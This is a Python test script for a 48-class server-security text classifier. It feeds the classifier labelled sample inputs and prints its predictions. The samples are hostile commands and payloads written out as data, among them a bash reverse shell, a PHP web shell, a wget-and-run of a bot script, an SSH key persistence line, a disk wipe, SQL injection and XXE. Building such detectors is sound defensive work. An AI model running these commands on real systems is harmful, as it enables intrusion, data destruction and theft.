"""
test_model.py
=============
Quick test script to validate the trained 48-class Enterprise VPS Security AI model.
Tests both Web attacks and Linux/Server attacks.
"""

from transformers import pipeline, AutoTokenizer, AutoModelForSequenceClassification
import torch

MODEL_DIR = "./trained_model"

print(f"Loading model from: {MODEL_DIR}...\n")
tokenizer = AutoTokenizer.from_pretrained(MODEL_DIR)
model = AutoModelForSequenceClassification.from_pretrained(MODEL_DIR)
model.eval()

classifier = pipeline(
    "text-classification",
    model=model,
    tokenizer=tokenizer,
    top_k=None,
    device=-1,
)

tests = [
    # --- WEB ATTACKS ---
    ("SQL Injection",                 "' OR 1=1 --"),
    ("SQL Drop Table",                "DROP TABLE users;--"),
    ("XSS",                           "<script>alert('xss')</script>"),
    ("Path Traversal",                "../../../../etc/passwd"),
    ("SSRF",                          "http://169.254.169.254/latest/meta-data/"),
    ("XXE",                           "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"),
    ("NoSQL Injection",               "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$ne\": null}}"),
    ("Command Injection",             "127.0.0.1; cat /etc/passwd"),
    ("File Upload Attack",            "filename=\"shell.php.jpg\""),

    # --- SERVER / LINUX ATTACKS ---
    ("SSH BruteForce",                "Aug 04 14:30:00 server sshd[1234]: Failed password for root from 192.168.1.100 port 54321 ssh2"),
    ("SSH Login Attack",              "Aug 04 14:31:00 server sshd[5678]: Invalid user admin from 10.0.0.5 port 43210"),
    ("Reverse Shell",                 "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
    ("Privilege Escalation",          "sudo -u root /usr/bin/find / -exec /bin/sh \\;"),
    ("Suspicious Bash Command",       "history -c && unset HISTFILE && export HISTFILESIZE=0"),
    ("Linux Command Injection",       "; rm -rf / --no-preserve-root"),
    ("WebShell",                      "<?php system($_GET['cmd']); ?>"),
    ("Port Scanning",                 "nmap -sS -p 1-65535 192.168.1.0/24"),
    ("Docker Abuse",                  "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"),
    ("Cron Abuse",                    "echo '* * * * * root /tmp/backdoor.sh' >> /etc/crontab"),
    ("Persistence",                   "echo 'ssh-rsa AAAA... attacker@evil' >> /root/.ssh/authorized_keys"),
    ("Malicious System Command",      "dd if=/dev/urandom of=/dev/sda bs=1M count=1000"),
    ("Unauthorized File Mod",        "chmod 4755 /tmp/rootkit; chown root:root /tmp/rootkit"),
    ("Suspicious Process",            "root 1234 99.0 /tmp/.ICE-unix/xmrig -o stratum+tcp://pool.supportxmr.com:443"),
    ("System Enumeration",            "cat /etc/passwd && uname -a && id && whoami"),
    ("Kernel Exploit",                "./dirty_cow /usr/bin/passwd"),
    ("Linux Malware",                 "wget http://192.168.1.50/bot.sh -O /tmp/.hidden && chmod +x /tmp/.hidden && /tmp/.hidden"),
    ("Ransomware",                    "openssl enc -aes-256-cbc -in data.db -out data.db.locked -k secretkey123"),
    ("Cryptomining",                  "./xmrig --donate-level=0 -o pool.minexmr.com:3333 -u 4wallet..."),
    ("Failed Login",                  "Aug 04 14:32:00 server sudo: pam_unix(sudo:auth): authentication failure; logname=user1"),
    ("Root Login Attempt",            "Aug 04 14:33:00 server sshd[9012]: Accepted password for root from 185.220.101.1 port 22 ssh2"),
    ("Lateral Movement",              "scp /tmp/payload.sh user@10.0.0.2:/tmp/ && ssh user@10.0.0.2 'bash /tmp/payload.sh'"),

    # --- BENIGN TRAFFIC ---
    ("Benign HTTP Request",           "GET /api/v1/products?category=electronics HTTP/1.1"),
    ("Benign System Log",             "Aug 04 14:35:00 server systemd[1]: Started Daily Cleanup of Temporary Directories."),
    ("Benign SSH Session",            "Aug 04 14:36:00 server sshd[1122]: Accepted publickey for deploy from 10.0.0.1 port 52100 ssh2"),
]

print("=" * 80)
print(f"{'CATEGORY':<28} {'INPUT':<45} {'PREDICTION':<25} {'CONF':>6}")
print("=" * 80)

correct_count = 0
for category, text in tests:
    scores = classifier(text)[0]
    scores_sorted = sorted(scores, key=lambda x: x['score'], reverse=True)
    best = scores_sorted[0]
    top3 = [(s['label'], round(s['score'], 4)) for s in scores_sorted[:3]]

    pred = best['label']
    conf = best['score']

    print(f"\n[{category}]")
    print(f"  Input      : {text}")
    print(f"  Prediction : {pred:<28}  confidence: {conf:.4f}")
    print(f"  Top 3      : {top3}")

print("\n" + "=" * 80)
print("Test completed successfully!")
